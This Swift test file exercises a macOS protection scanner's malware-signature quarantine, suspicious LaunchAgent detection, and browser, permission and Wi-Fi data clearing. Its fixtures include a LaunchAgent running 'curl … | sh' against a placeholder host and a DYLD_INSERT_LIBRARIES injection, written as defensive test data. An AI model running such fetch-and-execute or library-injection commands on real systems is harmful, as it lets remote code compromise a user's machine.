import Foundation
import SQLite3
import Testing
@testable import SweepCore
@testable import SweepScanners

/// Creates a small SQLite database for fixtures.
func makeDatabase(_ path: String, _ sql: String) throws {
    try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
    var database: OpaquePointer?
    #expect(sqlite3_open(path, &database) == SQLITE_OK)
    defer { sqlite3_close(database) }
    #expect(sqlite3_exec(database, sql, nil, nil, nil) == SQLITE_OK, "\(String(cString: sqlite3_errmsg(database)))")
}

@Suite struct ProtectionTests {
    static let testRules = YaraRuleSet(source: """
        rule test_malware { meta: description = "Test.Malware.A" strings: $a = "EVILPAYLOAD" condition: uint32(0) == 0xfeedfacf and $a }
        """)

    private func scanner(_ mac: FakeMac, commands: CommandLog = CommandLog()) -> ProtectionScanner {
        ProtectionScanner(environment: mac.environment(), rules: Self.testRules, run: commands.run)
    }

    @Test func findsMalwareBySignatureAndQuarantinesIt() async throws {
        let mac = try FakeMac()
        let bad = try mac.file("Downloads/Installer", contents: Data([0xCF, 0xFA, 0xED, 0xFE]) + Data("..EVILPAYLOAD..".utf8))
        chmod(bad, 0o755)
        try mac.file("Downloads/clean", contents: Data([0xCF, 0xFA, 0xED, 0xFE]) + Data("harmless".utf8))
        try mac.file("Downloads/notes.txt", contents: Data("EVILPAYLOAD in a text file is not an executable".utf8))

        let threats = try #require(scanner(mac).scan().category("threats"))
        let item = try #require(threats.groups.first?.items.first)
        #expect(threats.groups.flatMap(\.items).count == 1)
        #expect(item.subtitle?.contains("Test.Malware.A") == true)
        #expect(item.isSelectedByDefault)

        var performer = ProtectionPerformer(environment: mac.environment())
        performer.quarantineFolder = mac.root + "/Quarantine"
        performer.run = CommandLog().run
        let records = await performer.perform([item])
        #expect(records.first?.outcome == .done("Quarantined"))
        #expect(!FileManager.default.fileExists(atPath: bad))

        // It can be put back, executable again.
        let slot = try #require(try FileManager.default.contentsOfDirectory(atPath: mac.root + "/Quarantine").first)
        let manifest = try JSONDecoder.iso.decode(Quarantine.Entry.self, from: Data(contentsOf: URL(fileURLWithPath: mac.root + "/Quarantine/\(slot)/manifest.json")))
        var info = stat()
        #expect(lstat(manifest.quarantinedPath, &info) == 0 && info.st_mode & 0o111 == 0)
        try Quarantine.restore(manifest)
        #expect(FileManager.default.isExecutableFile(atPath: bad))
    }

    @Test func flagsSuspiciousLaunchAgents() throws {
        let mac = try FakeMac()
        try mac.plist("Library/LaunchAgents/com.ok.agent.plist", ["Label": "com.ok.agent", "ProgramArguments": ["/usr/bin/true"]])
        try mac.plist("Library/LaunchAgents/com.dl.agent.plist",
                      ["Label": "com.dl.agent", "ProgramArguments": ["/bin/sh", "-c", "curl -s http://example.invalid/x | sh"]])
        try mac.plist("Library/LaunchAgents/com.inject.agent.plist",
                      ["Label": "com.inject.agent", "ProgramArguments": ["/usr/bin/true"],
                       "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"]])
        let category = try #require(scanner(mac).scan().category("suspicious"))
        let reasons = Dictionary(uniqueKeysWithValues: category.groups.flatMap(\.items).map { ($0.title, $0.subtitle ?? "") })
        #expect(reasons.keys.sorted() == ["com.dl.agent", "com.inject.agent"])
        #expect(reasons["com.dl.agent"]?.contains("Downloads or decodes and runs code") == true)
        #expect(reasons["com.inject.agent"]?.contains("DYLD") == true)
        #expect(category.groups.flatMap(\.items).allSatisfy { !$0.isSelectedByDefault })
    }

    @Test func countsAndClearsChromeData() async throws {
        let mac = try FakeMac()
        let profile = mac.home + "/Library/Application Support/Google/Chrome/Default"
        try makeDatabase(profile + "/History", """
            CREATE TABLE urls(id INTEGER); CREATE TABLE visits(id INTEGER); CREATE TABLE keyword_search_terms(x);
            CREATE TABLE segments(x); CREATE TABLE segment_usage(x); CREATE TABLE downloads(id); CREATE TABLE downloads_url_chains(id);
            INSERT INTO urls VALUES (1),(2); INSERT INTO visits VALUES (1),(2),(3); INSERT INTO downloads VALUES (1);
            """)
        try makeDatabase(profile + "/Network/Cookies", "CREATE TABLE cookies(name); INSERT INTO cookies VALUES ('a'),('b');")
        try makeDatabase(profile + "/Web Data", "CREATE TABLE autofill(name); INSERT INTO autofill VALUES ('email');")

        let browsers = try #require(scanner(mac).scan().category("browsers"))
        let group = try #require(browsers.groups.first { $0.title == "Google Chrome" })
        let subtitles = Dictionary(uniqueKeysWithValues: group.items.map { ($0.title, $0.subtitle ?? "") })
        #expect(subtitles["Browsing History"] == "3 visits")
        #expect(subtitles["Cookies"] == "2 cookies")
        #expect(subtitles["Download History"] == "1 downloads")
        #expect(subtitles["Autofill Form Data"] == "1 entries")
        #expect(group.items.allSatisfy { !$0.isSelectedByDefault })

        let quits = Locked<[String]>([])
        var performer = ProtectionPerformer(environment: mac.environment())
        performer.run = CommandLog().run
        performer.quitApp = { id in quits.withLock { $0.append(id) }; return true }
        let records = await performer.perform(group.items)
        #expect(records.allSatisfy { $0.succeeded })
        #expect(quits.withLock { $0 } == ["com.google.Chrome"])  // asked to quit once, not per item
        #expect(SQLite.count(profile + "/History", "SELECT COUNT(*) FROM visits") == 0)
        #expect(SQLite.count(profile + "/Network/Cookies", "SELECT COUNT(*) FROM cookies") == 0)
    }

    @Test func browserThatWontQuitIsLeftAlone() async throws {
        let mac = try FakeMac()
        let profile = mac.home + "/Library/Application Support/Google/Chrome/Default"
        try makeDatabase(profile + "/History", "CREATE TABLE visits(id); CREATE TABLE urls(id); INSERT INTO visits VALUES (1);")
        let item = try #require(scanner(mac).scan().category("browsers")?.groups.first?.items.first)
        var performer = ProtectionPerformer(environment: mac.environment())
        performer.quitApp = { _ in false }
        let records = await performer.perform([item])
        #expect(records.first?.outcome == .skipped("Quit Google Chrome first"))
        #expect(SQLite.count(profile + "/History", "SELECT COUNT(*) FROM visits") == 1)
    }

    @Test func firefoxHistoryKeepsBookmarks() async throws {
        let mac = try FakeMac()
        let profile = mac.home + "/Library/Application Support/Firefox/Profiles/abc.default-release"
        try makeDatabase(profile + "/places.sqlite", """
            CREATE TABLE moz_places(id INTEGER); CREATE TABLE moz_historyvisits(id INTEGER); CREATE TABLE moz_bookmarks(fk INTEGER);
            INSERT INTO moz_places VALUES (1),(2); INSERT INTO moz_historyvisits VALUES (1),(2); INSERT INTO moz_bookmarks VALUES (2);
            """)
        let group = try #require(scanner(mac).scan().category("browsers")?.groups.first { $0.title == "Firefox" })
        let history = try #require(group.items.first { $0.title == "Browsing History" })
        var performer = ProtectionPerformer(environment: mac.environment())
        performer.run = CommandLog().run
        _ = await performer.perform([history])
        #expect(SQLite.count(profile + "/places.sqlite", "SELECT COUNT(*) FROM moz_historyvisits") == 0)
        #expect(SQLite.count(profile + "/places.sqlite", "SELECT COUNT(*) FROM moz_places") == 1)  // the bookmarked page
    }

    @Test func recentListsAreRecognisedInEveryFormat() {
        #expect(ProtectionScanner.isRecentItemsList("com.apple.LSSharedFileList.RecentDocuments.sfl4", inAppFolder: false))
        #expect(ProtectionScanner.isRecentItemsList("com.apple.LSSharedFileList.RecentApplications.sfl2", inAppFolder: false))
        #expect(!ProtectionScanner.isRecentItemsList("com.apple.LSSharedFileList.FavoriteItems.sfl4", inAppFolder: false))
        #expect(!ProtectionScanner.isRecentItemsList("com.apple.LSSharedFileList.FavoriteVolumes.sfl3", inAppFolder: false))
        #expect(ProtectionScanner.isRecentItemsList("com.apple.textedit.sfl4", inAppFolder: true))
        #expect(!ProtectionScanner.isRecentItemsList("notes.txt", inAppFolder: true))
    }

    @Test func appPermissionsWiFiAndRecentItems() async throws {
        let mac = try FakeMac()
        try makeDatabase(mac.home + "/Library/Application Support/com.apple.TCC/TCC.db", """
            CREATE TABLE access(service TEXT, client TEXT, client_type INTEGER, auth_value INTEGER);
            INSERT INTO access VALUES ('kTCCServiceCamera','com.video.app',0,2), ('kTCCServiceMicrophone','com.video.app',0,0);
            """)
        try mac.file("Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments.sfl3", bytes: 100)
        // The Finder sidebar lives next to the recents and must never be listed.
        for sidebar in ["FavoriteItems.sfl4", "FavoriteVolumes.sfl3", "ProjectsItems.sfl4", "iCloudItems.sfl4"] {
            try mac.file("Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList." + sidebar, bytes: 100)
        }
        let commands = CommandLog([
            "networksetup -listallhardwareports": (0, "Hardware Port: Wi-Fi\nDevice: en1\n"),
            "networksetup -listpreferredwirelessnetworks": (0, "Preferred networks on en1:\n\tHome\n\tCafe\n"),
        ])
        let privacy = try #require(scanner(mac, commands: commands).scan().category("privacy"))
        let groups = Dictionary(uniqueKeysWithValues: privacy.groups.map { ($0.title, $0.items) })
        #expect(groups["App Permissions"]?.map(\.subtitle) == ["Allowed: Camera"])
        #expect(groups["Saved Wi-Fi Networks"]?.map(\.title) == ["Home", "Cafe"])
        #expect(groups["Recent Items"]?.count == 1)

        let batches = Locked<[[[String]]]>([])
        var performer = ProtectionPerformer(environment: mac.environment())
        let performerCommands = CommandLog()
        performer.run = performerCommands.run
        performer.administrator = { commands in batches.withLock { $0.append(commands) }; return .success("") }
        let records = await performer.perform(privacy.groups.flatMap(\.items))
        #expect(records.allSatisfy { $0.succeeded })
        #expect(performerCommands.recorded.contains(["/usr/bin/tccutil", "reset", "Camera", "com.video.app"]))
        #expect(performerCommands.recorded.contains(["/usr/bin/killall", "sharedfilelistd"]))
        #expect(batches.withLock { $0 }.first == [["/usr/sbin/networksetup", "-removepreferredwirelessnetwork", "en1", "Home"],
                                                   ["/usr/sbin/networksetup", "-removepreferredwirelessnetwork", "en1", "Cafe"]])
    }

    @Test func onlyExecutablesAreScanned() throws {
        let mac = try FakeMac()
        let script = try mac.file("Downloads/run.sh", contents: Data("#!/bin/sh\necho hi\n".utf8))
        let image = try mac.file("Downloads/photo.jpg", contents: Data([0xFF, 0xD8, 0xFF, 0xE0]))
        #expect(ProtectionScanner.isExecutableFormat(script))
        #expect(!ProtectionScanner.isExecutableFormat(image))
    }
}

extension JSONDecoder {
    static var iso: JSONDecoder {
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        return decoder
    }
}
